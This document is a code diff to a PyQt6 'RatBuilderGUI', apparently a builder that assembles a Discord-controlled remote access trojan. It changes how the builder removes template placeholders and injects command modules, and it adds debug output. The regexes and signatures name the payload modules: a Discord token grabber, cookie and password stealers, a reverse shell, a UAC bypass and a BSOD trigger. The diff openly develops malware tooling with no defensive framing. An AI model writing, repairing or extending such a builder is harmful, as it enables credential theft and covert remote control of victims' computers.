@@ -3,6 +3,7 @@ import os
 import shutil
 import subprocess
 import base64
+import re
 from PyQt6.QtWidgets import (QApplication, QMainWindow, QVBoxLayout, QHBoxLayout, 
                              QWidget, QCheckBox, QLineEdit, QLabel, QPushButton, 
                              QGroupBox, QMessageBox, QFrame, QTextEdit,QInputDialog)
@@ -486,58 +487,59 @@ class RatBuilderGUI(QMainWindow):
             else:
                 self.output_text.append(f"❌ Command file not found: {command_path}")
 
-        # Remove all placeholder command definitions using a more robust method
-        import re
+        # Remove ALL existing placeholder commands completely
+        # We'll remove everything between the first placeholder and the token decoding section
+        self.output_text.append("🧹 Cleaning template placeholders...")
         
-        # Remove placeholder commands using regex patterns
-        placeholder_patterns = [
-            r'@bot\.command\(\)\s*\n\s*async def tkn_grab\(ctx\):#done.*?\n.*?filename="discord_token_grabber\.py"',
-            r'@bot\.command\(\)\s*\n\s*async def bsod\(ctx\):#done.*?\n.*?filename="bsod\.py"',
-            r'@bot\.command\(\)\s*\n\s*async def get_cookies\(ctx\):#done.*?\n.*?filename="get_cookies\.py"',
-            r'@bot\.command\(\)\s*\n\s*async def pass_light\(ctx\):#done.*?\n.*?filename="passwords_grabber\.py"',
-            r'@bot\.command\(\)\s*\n\s*async def pass_heavy\(ctx,bot_k,cat_id\):#done.*?\n.*?filename="gruppe\.py"',
-            r'@bot\.command\(\)\s*\n\s*async def reverse_shell\(ctx\):#done.*?\n.*?filename="reverse_shell"',
-            r'@bot\.comnand\(\)\s*\n\s*async def uac\(ctx\):.*?\n.*?filename="uac_bypass\.py"'
-        ]
+        # Find the start of placeholder section and the start of execution section
+        placeholder_start = template_content.find('@bot.command()')
+        execution_start = template_content.find('decoded_token = decode_token(ENCODED_TOKEN)')
         
-        for pattern in placeholder_patterns:
-            template_content = re.sub(pattern, '', template_content, flags=re.DOTALL)
+        if placeholder_start != -1 and execution_start != -1:
+            # Remove everything between the first command placeholder and the execution section
+            template_content = template_content[:placeholder_start] + template_content[execution_start:]
+            self.output_text.append("✅ Removed placeholder commands")
+        else:
+            self.output_text.append("⚠️ Could not find placeholder section, using fallback cleanup")
+            # Fallback: remove common placeholder patterns
+            placeholder_patterns = [
+                r'@bot\.command\(\)\s*\nasync def tkn_grab\(ctx\):#done.*?\n.*?filename="discord_token_grabber\.py"',
+                r'@bot\.command\(\)\s*\nasync def bsod\(ctx\):#done.*?\n.*?filename="bsod\.py"',
+                r'@bot\.command\(\)\s*\nasync def get_cookies\(ctx\):#done.*?\n.*?filename="get_cookies\.py"',
+                r'@bot\.command\(\)\s*\nasync def pass_light\(ctx\):#done.*?\n.*?filename="passwords_grabber\.py"',
+                r'@bot\.command\(\)\s*\nasync def pass_heavy\(ctx,bot_k,cat_id\):#done.*?\n.*?filename="gruppe\.py"',
+                r'@bot\.command\(\)\s*\nasync def reverse_shell\(ctx\):#done.*?\n.*?filename="reverse_shell"',
+                r'@bot\.comnand\(\)\s*\nasync def uac\(ctx\):.*?\n.*?filename="uac_bypass\.py"'
+            ]
+            
+            for pattern in placeholder_patterns:
+                template_content = re.sub(pattern, '', template_content, flags=re.DOTALL)
         
-        # Clean up any empty lines caused by removal
-        template_content = re.sub(r'\n\s*\n\s*\n', '\n\n', template_content)
-        
-        # Insert command definitions in the correct location
+        # Insert command definitions in the correct location - RIGHT BEFORE the bot execution
         if command_definitions:
             commands_section = '\n\n'.join(command_definitions)
             
-            # Find the insertion point - look for the marker or create one
-            insertion_marker = "# Commands are added by the builder above this line"
+            # Find the exact location to insert - right before the token decoding
+            insertion_point = template_content.find('decoded_token = decode_token(ENCODED_TOKEN)')
             
-            if insertion_marker in template_content:
-                # Insert commands right before the marker
-                template_content = template_content.replace(
-                    insertion_marker, 
-                    commands_section + '\n\n' + insertion_marker
-                )
-                self.output_text.append("✅ Commands inserted before execution code")
+            if insertion_point != -1:
+                # Insert commands with proper spacing
+                template_content = (template_content[:insertion_point] + 
+                                  '\n\n' + commands_section + '\n\n' + 
+                                  template_content[insertion_point:])
+                self.output_text.append("✅ Commands inserted before bot execution")
             else:
-                # Look for the bot.run section and insert before it
-                bot_run_pattern = r'bot\.run\(.*?\)'
-                if re.search(bot_run_pattern, template_content):
-                    # Insert before bot.run
-                    template_content = re.sub(
-                        bot_run_pattern,
-                        commands_section + '\n\n' + re.search(bot_run_pattern, template_content).group(),
-                        template_content
-                    )
-                    self.output_text.append("✅ Commands inserted before bot.run")
-                else:
-                    # Emergency fallback: insert before last 10 lines
-                    lines = template_content.split('\n')
-                    insert_pos = max(0, len(lines) - 10)
+                # Fallback: insert before the last 10 lines
+                lines = template_content.split('\n')
+                if len(lines) > 10:
+                    insert_pos = len(lines) - 10
                     lines.insert(insert_pos, '\n\n' + commands_section + '\n\n')
                     template_content = '\n'.join(lines)
                     self.output_text.append("⚠️ Commands inserted using fallback method")
+                else:
+                    # Last resort: append before the end
+                    template_content = template_content + '\n\n' + commands_section + '\n\n'
+                    self.output_text.append("⚠️ Commands appended to end")
         else:
             self.output_text.append("⚠️ No commands to insert")
         
@@ -547,42 +549,44 @@ class RatBuilderGUI(QMainWindow):
             f.write(template_content)
         
         self.output_text.append(f"✅ Generated Python file: {os.path.basename(python_filename)}")
+        
+        # Debug: Show the structure of the generated file
+        self.output_text.append("🔍 Final file structure:")
+        lines = template_content.split('\n')
+        command_count = 0
+        for i, line in enumerate(lines):
+            if '@bot.command()' in line:
+                self.output_text.append(f"   Line {i}: {line.strip()}")
+                command_count += 1
+        self.output_text.append(f"   Total commands found: {command_count}")
+        
         return python_filename
 
     def format_command_code(self, command_name, code):
-        """Properly format command code with correct Python indentation and handle different signatures"""
-        # Define command signatures
-        command_signatures = {
-            'tkn_grab': 'ctx',
-            'bsod': 'ctx', 
-            'get_cookies': 'ctx',
-            'pass_light': 'ctx',
-            'pass_heavy': 'ctx, bot_k, cat_id',
-            'reverse_shell': 'ctx',
-            'uac': 'ctx'
-        }
-        
-        signature = command_signatures.get(command_name, 'ctx')
-        
+        """Properly format command code with correct Python indentation"""
         lines = code.split('\n')
         formatted_lines = []
         
         # Add the command decorator and function definition
         formatted_lines.append(f"@bot.command()")
         formatted_lines.append(f"@is_correct_user_channel()")
-        formatted_lines.append(f"async def {command_name}({signature}):")
+        
+        # Use the correct function signature based on command
+        if command_name == 'pass_heavy':
+            formatted_lines.append(f"async def {command_name}(ctx, bot_k, cat_id):")
+        else:
+            formatted_lines.append(f"async def {command_name}(ctx):")
         
         # Add the command code with proper indentation
         for line in lines:
-            if line.strip():  # Only process non-empty lines
-                # Handle different indentations in source files
-                stripped_line = line.lstrip()
-                indent_level = len(line) - len(stripped_line)
-                # Convert to 4-space indentation
-                formatted_indent = '    ' + ' ' * (indent_level)
-                formatted_lines.append(formatted_indent + stripped_line)
+            stripped_line = line.strip()
+            if stripped_line:
+                # Handle different indentations in source files - convert to 4 spaces
+                current_indent = len(line) - len(line.lstrip())
+                new_indent = '    ' + (' ' * current_indent)
+                formatted_lines.append(new_indent + stripped_line)
             else:
-                formatted_lines.append("")  # Keep empty lines
+                formatted_lines.append("    ")  # Keep empty lines with proper indentation
         
         return '\n'.join(formatted_lines)
     
